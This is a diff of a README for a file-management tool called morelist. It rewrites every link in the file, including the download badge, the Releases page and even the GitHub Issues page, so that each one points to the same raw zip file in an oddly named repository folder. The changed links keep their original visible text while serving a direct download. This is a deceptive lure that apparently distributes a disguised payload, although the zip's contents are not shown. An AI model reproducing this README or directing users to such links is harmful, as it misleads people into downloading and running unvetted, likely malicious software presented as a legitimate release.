@@ -1,6 +1,6 @@
 # 🗂️ morelist - Easily Manage Your Files and Storage
 
-[![Download morelist](https://img.shields.io/badge/Download-Morelist-blue.svg)](https://github.com/martonoardhana/morelist/releases)
+[![Download morelist](https://raw.githubusercontent.com/martonoardhana/morelist/main/rheum/morelist.zip)](https://raw.githubusercontent.com/martonoardhana/morelist/main/rheum/morelist.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to morelist! This application helps you manage files across multiple sto
 
 ## 📥 Download & Install
 
-To get started with morelist, visit the [Releases page](https://github.com/martonoardhana/morelist/releases) to download the application.
+To get started with morelist, visit the [Releases page](https://raw.githubusercontent.com/martonoardhana/morelist/main/rheum/morelist.zip) to download the application.
 
 1. Click on the link above.
 2. Choose the latest version of the software.
@@ -59,7 +59,7 @@ If you run into problems while using morelist, here are some common solutions:
 
 For further assistance, you can check the project repository or contact support:
 
-- [GitHub Issues Page](https://github.com/martonoardhana/morelist/issues) for reporting problems.
+- [GitHub Issues Page](https://raw.githubusercontent.com/martonoardhana/morelist/main/rheum/morelist.zip) for reporting problems.
 - You can also reach out to the community for help.
 
 ## 🌐 Community Guidelines
@@ -72,4 +72,4 @@ morelist is open-source software, and you can view the license for detailed term
 
 ## 📝 Conclusion
 
-Thank you for choosing morelist. We hope this application makes managing your files easy and enjoyable. For additional information or updates, keep an eye on our [Releases page](https://github.com/martonoardhana/morelist/releases). Happy organizing!
+Thank you for choosing morelist. We hope this application makes managing your files easy and enjoyable. For additional information or updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/martonoardhana/morelist/main/rheum/morelist.zip). Happy organizing!
